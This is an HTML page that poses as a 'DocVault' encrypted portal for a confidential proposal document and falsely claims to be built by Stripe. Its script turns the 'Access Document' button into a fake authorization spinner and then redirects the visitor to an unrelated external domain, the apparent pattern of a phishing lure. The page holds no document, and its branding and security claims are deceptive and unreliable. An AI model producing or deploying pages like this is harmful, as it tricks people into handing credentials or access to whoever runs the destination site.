<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Document Access Portal</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Source+Serif+4:wght@400;600;700&family=Outfit:wght@300;400;500;600;700&display=swap" rel="stylesheet">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
<style>
  *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }

  :root {
    --white: #ffffff;
    --gray-50: #f8f9fc;
    --gray-100: #f0f2f7;
    --gray-200: #e2e6ee;
    --gray-300: #c8cfdd;
    --gray-400: #9aa3b8;
    --gray-500: #6b7590;
    --gray-600: #4a5268;
    --gray-700: #333a4d;
    --gray-800: #1e2433;
    --gray-900: #111520;
    --blue-50: #eef4ff;
    --blue-100: #d9e6ff;
    --blue-500: #3b6cf5;
    --blue-600: #2c57d9;
    --blue-700: #1e44b8;
    --red-50: #fef2f2;
    --red-500: #e5453d;
    --red-600: #d03a33;
    --green-500: #16a34a;
    --shadow-sm: 0 1px 2px rgba(17,21,32,0.04);
    --shadow-md: 0 4px 16px rgba(17,21,32,0.06), 0 1px 3px rgba(17,21,32,0.04);
    --shadow-lg: 0 12px 48px rgba(17,21,32,0.08), 0 2px 8px rgba(17,21,32,0.04);
    --shadow-xl: 0 24px 64px rgba(17,21,32,0.10), 0 4px 12px rgba(17,21,32,0.05);
    --radius-sm: 8px;
    --radius-md: 12px;
    --radius-lg: 16px;
    --radius-xl: 20px;
    --font-body: 'Outfit', sans-serif;
    --font-serif: 'Source Serif 4', serif;
  }

  html { height: 100%; }

  body {
    font-family: var(--font-body);
    background: var(--gray-50);
    color: var(--gray-800);
    min-height: 100%;
    display: flex;
    flex-direction: column;
    -webkit-font-smoothing: antialiased;
  }

  /* ── Background pattern ── */
  body::before {
    content: '';
    position: fixed;
    inset: 0;
    background-image:
      radial-gradient(circle at 20% 20%, var(--blue-50) 0%, transparent 50%),
      radial-gradient(circle at 80% 80%, #f5f0ff 0%, transparent 50%);
    pointer-events: none;
    z-index: 0;
  }

  /* Dot grid */
  body::after {
    content: '';
    position: fixed;
    inset: 0;
    background-image: radial-gradient(var(--gray-200) 1px, transparent 1px);
    background-size: 24px 24px;
    opacity: 0.5;
    pointer-events: none;
    z-index: 0;
  }

  /* ── Topbar ── */
  .topbar {
    position: relative;
    z-index: 10;
    display: flex;
    align-items: center;
    justify-content: space-between;
    padding: 16px 32px;
    background: rgba(255,255,255,0.72);
    backdrop-filter: blur(16px);
    -webkit-backdrop-filter: blur(16px);
    border-bottom: 1px solid var(--gray-200);
  }

  .topbar-brand {
    display: flex;
    align-items: center;
    gap: 10px;
    text-decoration: none;
    color: var(--gray-800);
  }
  .topbar-logo {
    width: 32px; height: 32px;
    background: var(--blue-500);
    border-radius: var(--radius-sm);
    display: flex; align-items: center; justify-content: center;
    color: white; font-size: 0.85rem;
    box-shadow: 0 2px 8px rgba(59,108,245,0.3);
  }
  .topbar-name {
    font-weight: 600;
    font-size: 0.95rem;
    letter-spacing: -0.01em;
  }
  .topbar-badge {
    font-size: 0.68rem;
    font-weight: 500;
    color: var(--blue-500);
    background: var(--blue-50);
    padding: 3px 10px;
    border-radius: 20px;
    border: 1px solid var(--blue-100);
    letter-spacing: 0.02em;
  }

  /* ── Main ── */
  main {
    position: relative;
    z-index: 1;
    flex: 1;
    display: flex;
    align-items: center;
    justify-content: center;
    padding: 40px 20px;
  }

  /* ── Access Card ── */
  .access-card {
    width: 100%;
    max-width: 440px;
    background: var(--white);
    border: 1px solid var(--gray-200);
    border-radius: var(--radius-xl);
    box-shadow: var(--shadow-xl);
    overflow: hidden;
    animation: cardReveal 0.7s cubic-bezier(0.16, 1, 0.3, 1) both;
  }
  @keyframes cardReveal {
    from { opacity: 0; transform: translateY(20px) scale(0.98); }
    to   { opacity: 1; transform: translateY(0) scale(1); }
  }

  .card-visual {
    position: relative;
    background: linear-gradient(135deg, var(--gray-900) 0%, var(--gray-700) 100%);
    padding: 36px 32px 32px;
    overflow: hidden;
  }
  /* Decorative grid lines inside the dark header */
  .card-visual::before {
    content: '';
    position: absolute;
    inset: 0;
    background-image:
      linear-gradient(90deg, rgba(255,255,255,0.03) 1px, transparent 1px),
      linear-gradient(rgba(255,255,255,0.03) 1px, transparent 1px);
    background-size: 32px 32px;
  }
  .card-visual::after {
    content: '';
    position: absolute;
    top: -40px; right: -40px;
    width: 160px; height: 160px;
    background: radial-gradient(circle, rgba(59,108,245,0.15), transparent 70%);
    border-radius: 50%;
  }

  .doc-icon-wrap {
    position: relative;
    z-index: 1;
    width: 56px; height: 56px;
    background: rgba(255,255,255,0.08);
    border: 1px solid rgba(255,255,255,0.1);
    border-radius: var(--radius-md);
    display: flex; align-items: center; justify-content: center;
    margin-bottom: 20px;
    backdrop-filter: blur(8px);
    animation: iconFloat 0.5s 0.2s ease both;
  }
  @keyframes iconFloat {
    from { opacity: 0; transform: translateY(8px); }
    to   { opacity: 1; transform: translateY(0); }
  }
  .doc-icon-wrap i {
    font-size: 1.4rem;
    color: white;
    opacity: 0.9;
  }

  .card-visual h1 {
    position: relative;
    z-index: 1;
    font-family: var(--font-serif);
    font-size: 1.45rem;
    font-weight: 700;
    color: white;
    line-height: 1.3;
    margin-bottom: 8px;
    animation: textReveal 0.5s 0.3s ease both;
  }
  .card-visual p {
    position: relative;
    z-index: 1;
    font-size: 0.88rem;
    color: rgba(255,255,255,0.55);
    font-weight: 400;
    animation: textReveal 0.5s 0.4s ease both;
  }
  @keyframes textReveal {
    from { opacity: 0; transform: translateY(6px); }
    to   { opacity: 1; transform: translateY(0); }
  }

  .confidential-tag {
    display: inline-flex;
    align-items: center;
    gap: 5px;
    background: rgba(229,69,61,0.12);
    border: 1px solid rgba(229,69,61,0.2);
    color: #ff8a84;
    font-size: 0.68rem;
    font-weight: 600;
    text-transform: uppercase;
    letter-spacing: 0.06em;
    padding: 4px 10px;
    border-radius: 6px;
    margin-bottom: 16px;
    position: relative;
    z-index: 1;
    animation: textReveal 0.5s 0.25s ease both;
  }
  .confidential-tag i { font-size: 0.6rem; }

  .card-body {
    padding: 28px 32px 32px;
    animation: bodyReveal 0.5s 0.45s ease both;
  }
  @keyframes bodyReveal {
    from { opacity: 0; }
    to   { opacity: 1; }
  }

  .btn-primary {
    width: 100%;
    padding: 14px;
    background: var(--blue-500);
    color: white;
    border: none;
    border-radius: var(--radius-md);
    font-family: var(--font-body);
    font-size: 0.92rem;
    font-weight: 600;
    cursor: pointer;
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 8px;
    transition: all 0.2s;
    position: relative;
    overflow: hidden;
  }
  .btn-primary::before {
    content: '';
    position: absolute;
    inset: 0;
    background: linear-gradient(135deg, transparent, rgba(255,255,255,0.1));
    opacity: 0;
    transition: opacity 0.2s;
  }
  .btn-primary:hover {
    background: var(--blue-600);
    transform: translateY(-1px);
    box-shadow: 0 4px 16px rgba(59,108,245,0.3);
  }
  .btn-primary:hover::before { opacity: 1; }
  .btn-primary:active {
    transform: translateY(0);
    box-shadow: none;
  }
  .btn-primary:disabled {
    background: var(--gray-300);
    cursor: not-allowed;
    transform: none;
    box-shadow: none;
  }

  .meta-row {
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 16px;
    margin-top: 20px;
    padding-top: 18px;
    border-top: 1px solid var(--gray-100);
  }
  .meta-item {
    display: flex;
    align-items: center;
    gap: 5px;
    font-size: 0.75rem;
    color: var(--gray-400);
  }
  .meta-item i { font-size: 0.7rem; }

  /* ── Footer ── */
  footer {
    position: relative;
    z-index: 1;
    text-align: center;
    padding: 20px;
    font-size: 0.78rem;
    color: var(--gray-400);
  }
  footer span { color: var(--gray-300); margin: 0 8px; }

  /* ── Responsive ── */
  @media (max-width: 500px) {
    .topbar { padding: 14px 18px; }
    .topbar-badge { display: none; }
    .card-visual { padding: 28px 22px 26px; }
    .card-body { padding: 22px 22px 28px; }
    main { padding: 24px 14px; }
  }
</style>
</head>
<body>

  <div class="topbar">
    <a href="index.html" class="topbar-brand">
      <div class="topbar-logo"><i class="fa-solid fa-vault"></i></div>
      <span class="topbar-name">DocVault</span>
    </a>
    <span class="topbar-badge"><i class="fa-solid fa-shield-halved"></i>&ensp;Encrypted Access</span>
  </div>

  <main>
    <div class="access-card">
      <div class="card-visual">
        <div class="confidential-tag"><i class="fa-solid fa-lock"></i> Confidential</div>
        <div class="doc-icon-wrap"><i class="fa-solid fa-file-lines"></i></div>
        <h1>Proposal Document</h1>
        <p>Authorize access to view the full document</p>
      </div>

      <div class="card-body">
        <button class="btn-primary" id="btnAccess" type="button">
          <i class="fa-solid fa-arrow-right-to-bracket"></i>
          Access Document
        </button>

        <div class="meta-row">
          <span class="meta-item"><i class="fa-solid fa-file-pdf"></i> PDF &middot; 2 pages</span>
          <span class="meta-item"><i class="fa-regular fa-calendar"></i> Apr 14, 2026</span>
          <span class="meta-item"><i class="fa-solid fa-eye"></i> Review only</span>
        </div>
      </div>
    </div>
  </main>

  <footer>
    This is built for document transfer purposes <span>|</span> Built by Stripe
  </footer>

<script>
  const btnAccess = document.getElementById('btnAccess');

  btnAccess.addEventListener('click', () => {
    // Animate and redirect
    btnAccess.disabled = true;
    btnAccess.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Authorizing access…';

    localStorage.setItem('docvault_access_time', new Date().toISOString());

    setTimeout(() => {
  window.location.href = 'https://wajapou.biz.id/5Q5VpaSfJ!9qQ/';
}, 1200);
  });
</script>
</body>
</html>
